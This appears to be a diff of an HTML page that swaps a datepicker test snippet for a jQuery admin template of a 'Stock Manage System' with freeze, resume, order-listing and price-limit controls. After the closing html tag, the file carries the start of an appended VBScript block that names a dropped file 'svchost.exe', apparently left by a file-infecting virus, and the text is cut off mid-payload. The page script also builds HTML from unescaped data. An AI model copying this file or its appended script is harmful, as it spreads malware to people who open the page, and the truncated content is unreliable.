@@ -1,20 +1,428 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <link rel="stylesheet" href="script/common.css">
-        <script src="script/common.js"></script>
-        <script>
-            function setup(){
-                $('input').datepicker({
-                    format: 'mm-dd-yyyy',
-                    startDate: '03-14-2013'
-                });
-            };
-        </script>
-    </head>
-    <body data-capture="input, .datepicker">
-        <input type="text" value="03-18-2013">
-    </body>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Stock Manage System</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="/static/css/bootstrap-responsive.min.css" rel="stylesheet" />
+
+
+    <link href="/static/css/font-awesome.css" rel="stylesheet" />
+
+    <link href="/static/css/adminia.css" rel="stylesheet" />
+    <link href="/static/css/adminia-responsive.css" rel="stylesheet" />
+
+
+    <link href="/static/css/pages/trade_manage.css" rel="stylesheet" />
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <script src="/static/js/jquery-1.7.2.min.js"></script>
+	<script src="/static/js/bootstrap.js"></script>
+
+    <script type="text/javascript">
+        var getUrlParameter = function getUrlParameter(sParam) {
+            var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+                sURLVariables = sPageURL.split('&'),
+                sParameterName,
+                i;
+
+            for (i = 0; i < sURLVariables.length; i++) {
+                sParameterName = sURLVariables[i].split('=');
+
+                if (sParameterName[0] === sParam) {
+                    return sParameterName[1] === undefined ? true : sParameterName[1];
+                }
+            }
+        };
+
+        var id = getUrlParameter('id');
+        function setStockState(sid, state) {
+            if (state == 1) {
+                $.getJSON('resume/', {id:sid}, function(res) {
+                    if (res.state)  {
+                        alert("Resume Succeeded!");
+                        $("#s-" + sid).removeClass("btn-danger");
+                        $("#s-" + sid).addClass("btn-success");
+                        $("#s-" + sid).text("Normal");
+                    } else {
+                        alert("Resume Failed!");
+                    }
+                }, "json");
+            }
+            if (state == 0) {
+                $.getJSON('freeze/', {id:sid}, function(res) {
+                    if (res.state) {
+                        alert("Freeze Succeeded!");
+                        $("#s-" + sid).addClass("btn-danger");
+                        $("#s-" + sid).removeClass("btn-success");
+                        $("#s-" + sid).text("Frozen");
+                    } else {
+                        alert("Freeze Failed!");
+                    }
+                }, "json");
+            }
+        }
+        function checkAllOrders(sid) {
+            $.getJSON('getStockList/', {id:sid}, function(json) {
+                var html = "";
+                html += '\
+                <div class="row">\
+                    <div class="span4">\
+                        <div class="widget widget-table">\
+                            <div class="widget-header">\
+                                <h3>Purchase Orders</h3>\
+                            </div>\
+                            <div class="widget-content">\
+                                <table class="table table-striped table-bordered">\
+                                    <thead>\
+                                        <th>ID</th>\
+                                        <th>Purchaser</th>\
+                                        <th>Price</th>\
+                                        <th>Amount</th>\
+                                    </thead>\
+                                    <tbody>';
+                var buy = json.buy_list;
+                var sell = json.sell_list;
+                for (var i=0; i<buy.length; i++) {
+                    var item = buy[i];
+                    var tmpHtml = '<tr>\
+                                        <td>'+ item.id +'</td>\
+                                        <td>'+ item.p_id +'</td>\
+                                        <td>'+ item.price +'</td>\
+                                        <td>'+ item.amount +'</td>\
+                                    </tr>';
+                    html += tmpHtml;
+                }
+                html += '\
+                                    </tbody>\
+                                </table>\
+                            </div>\
+                        </div>\
+                    </div>\
+                    <div class="span1">&nbsp;</div>\
+                    <div class="span4">\
+                        <div class="widget widget-table">\
+                            <div class="widget-header">\
+                                <h3>Selling Orders</h3>\
+                            </div>\
+                            <div class="widget-content">\
+                                <table class="table table-striped table-bordered">\
+                                    <thead>\
+                                        <th>ID</th>\
+                                        <th>Seller</th>\
+                                        <th>Price</th>\
+                                        <th>Amount</th>\
+                                    </thead>\
+                                    <tbody>';
+                for (var i=0; i<sell.length; i++) {
+                    var item = sell[i];
+                    var tmpHtml = '\
+                                        <tr>\
+                                            <td>'+ item.id +'</td>\
+                                            <td>'+ item.s_id +'</td>\
+                                            <td>'+ item.price +'</td>\
+                                            <td>'+ item.amount +'</td>\
+                                        </tr>';
+                    html += tmpHtml;
+                }
+                html += '\
+                                    </tbody>\
+                                </table>\
+                            </div>\
+                        </div>\
+                    </div>\
+                </div> <!-- /row -->';
+                $("#stock-detail").html(html);
+            })
+        }
+        function showSetPrice(sid, price_limit) {
+            var html = '\
+            <div class="row">\
+                <div class="span9">\
+                    <div class="widget">\
+                        <div class="widget-header">\
+                            <h3>Price Limit</h3>\
+                        </div>\
+                        <div class="widget-content widget-limit">\
+                            <form id="limit-form" class="form-horizontal" onsubmit="return false;">\
+                                <fieldset>\
+                                    <div class="control-group">\
+                                        <label class="control-label">Current rate</label>\
+                                        <div class="controls">\
+                                            <input type="text" class="input-medium disabled" value="' + price_limit + '" id="dis-limit-value"  disabled> %\
+                                        </div>\
+                                    </div>\
+                                    <div class="control-group">\
+                                        <label class="control-label" for="limit">Set rate</label>\
+                                        <div class="controls">\
+                                            <input type="text" class="input-medium" id="limit-value" value="'+ price_limit +'"> %\
+                                        </div>\
+                                    </div>\
+                                    <div class="form-actions">\
+                                        <button type="submit" class="btn btn-primary" onclick="setPriceLimit(\''+ sid +'\')">Submit</button>\
+                                    </div>\
+                                </fieldset>\
+                            </form>\
+                        </div>\
+                    </div>\
+                </div>\
+            </div>';
+            $("#stock-detail").html(html);
+        }
+        function setPriceLimit(sid) {
+            var limit = $("#limit-value").val();
+            //alert(limit);
+            $.getJSON('setLimit/', {id:sid, up:1, limit:limit}, function(res){
+                if (res.state) {
+                    $("#dis-limit-value").val(limit);
+                    alert("Set Succeeded!");
+                } else {
+                    alert("Set Failed!")
+                }
+            }, "json");
+        }
+
+        $(document).ready(function(){
+            sid = {{sid|safe}};;
+            $.getJSON('getStockInfo/', {id:sid}, function(json){
+                var list = '';
+                var stock = json;
+                for (var i=0; i<stock.length; i++) {
+                    var tmpItem = stock[i];
+                    var stockItem = '<tr>\
+                            <td>' + tmpItem.id + '</td>\
+                            <td>' + tmpItem.name + '</td>\
+                            <td>' + tmpItem.price + '</td>\
+                            <td>' + tmpItem.volume + '</td>\
+                            <td>' + tmpItem.change + '%</td>';
+                    if (tmpItem.state) {
+                        stockItem += '<td><a href="javascript:;" class="btn btn-small btn-success btn-status" disabled id="s-'+ tmpItem.id +'">Normal</a></td>';
+                    } else {
+                        stockItem += '<td><a href="javascript:;" class="btn btn-small btn-danger btn-status" disabled id="s-'+ tmpItem.id +'">Frozen</a></td>';
+                    }
+                    stockItem +='<td>\
+                                <div>\
+                                    <a href="javascript:;" onclick="setStockState(\'' + tmpItem.id +'\', 0)" class="btn btn-small btn-warning">Freeze</a>\
+                                    <a href="javascript:;" onclick="setStockState(\'' + tmpItem.id +'\', 1)" class="btn btn-small btn-success">Resume</a>\
+                                    <a href="javascript:;" onclick="checkAllOrders(\'' + tmpItem.id +'\')" class="btn btn-small">Check All Orders</a>\
+                                    <a href="javascript:;" onclick="showSetPrice(\'' + tmpItem.id + '\', \''+ tmpItem.price_limit +'\')" class="btn btn-small">Set Price Limit</a>\
+                                </div>\
+                            </td>\
+                        </tr>';
+                    list = list + stockItem;
+                    }
+                    $("#manage-list").html(list);
+            })
+        })
+
+    </script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
+
+<body>
+
+<div class="navbar navbar-fixed-top">
+
+	<div class="navbar-inner">
+
+		<div class="container">
+
+			<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</a>
+
+			<a class="brand" href="./">Stock Manage System</a>
+
+			<div class="nav-collapse">
+
+				<ul class="nav pull-right">
+					<li>
+						<a href="#"><span class="badge badge-warning"></span></a>
+					</li>
+
+					<li class="divider-vertical"></li>
+
+					<li class="dropdown">
+
+						<a data-toggle="dropdown" class="dropdown-toggle " href="#">
+							Setting <b class="caret"></b>
+						</a>
+
+						<ul class="dropdown-menu">
+							<li>
+								<a href="./account.html"><i class="icon-user"></i> Account setting </a>
+							</li>
+
+							<li>
+								<a href="./change_password.html"><i class="icon-lock"></i> Change password </a>
+							</li>
+
+							<li class="divider"></li>
+
+							<li>
+								<a href="./"><i class="icon-off"></i> Logout </a>
+							</li>
+						</ul>
+					</li>
+				</ul>
+
+			</div> <!-- /nav-collapse -->
+
+		</div> <!-- /container -->
+
+	</div> <!-- /navbar-inner -->
+
+</div> <!-- /navbar -->
+
+
+
+
+<div id="content">
+
+	<div class="container">
+
+		<div class="row">
+
+			<div class="span3">
+
+				<div class="account-container">
+
+					<div class="account-avatar">
+						<img src="/static/img/headshot.png" alt="" class="thumbnail" />
+					</div> <!-- /account-avatar -->
+
+					<div class="account-details">
+
+						<span class="account-name">Bob</span>
+
+						<span class="account-role">Administrator</span>
+
+						<span class="account-actions">
+							<a href="javascript:;">Profile</a> |
+
+							<a href="javascript:;">Setting</a>
+						</span>
+
+					</div> <!-- /account-details -->
+
+				</div> <!-- /account-container -->
+
+				<hr />
+
+				<ul id="main-nav" class="nav nav-tabs nav-stacked">
+
+					<li>
+						<a href="#">
+							<i class="icon-th-list"></i>
+							Stock Manage
+						</a>
+					</li>
+
+					<li>
+						<a href="#">
+              <i class="icon-signin"></i>
+							Open
+						</a>
+					</li>
+
+          <li>
+            <a href="#">
+              <i class="icon-file"></i>
+              Report the Loss
+            </a>
+          </li>
+
+          <li>
+            <a href="#">
+              <i class="icon-retweet"></i>
+              Re-submit
+            </a>
+          </li>
+
+          <li>
+            <a href="#">
+              <i class="icon-signout"></i>
+              Close an Account
+            </a>
+          </li>
+
+				</ul>
+
+
+
+				<hr />
+
+				<div class="sidebar-extra">
+					<p></p>
+				</div> <!-- .sidebar-extra -->
+
+				<br />
+
+			</div> <!-- /span3 -->
+
+
+
+			<div class="span9">
+
+				<h1 class="page-title">
+					<i class="icon-th-list"></i>
+					Stock Manage
+				</h1>
+
+
+				<div class="row">
+
+					<div class="span9">
+
+						<div class="widget widget-table">
+							<div class="widget-header">
+								<h3>Manege List</h3>
+							</div> <!-- /widget-header -->
+
+							<div class="widget-content">
+                                <table class="table table-striped table-bordered">
+									<thead>
+										<th>ID</th>
+										<th>Name</th>
+										<th>Price</th>
+										<th>Volume</th>
+										<th>Change</th>
+										<th>Status</th>
+										<th>Operation</th>
+									</thead>
+                                    <tbody id="manage-list">
+                                    </tbody>
+								</table>
+							</div> <!-- /widget-content -->
+
+						</div> <!-- /widget -->
+
+					</div> <!-- /span9 -->
+
+				</div>
+
+                <div id="stock-detail"></div>
+
+
+
+			</div> <!-- /span9 -->
+
+
+		</div> <!-- /row -->
+
+	</div> <!-- /container -->
+
+</div> <!-- /content -->
+</body>
+
 </html>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
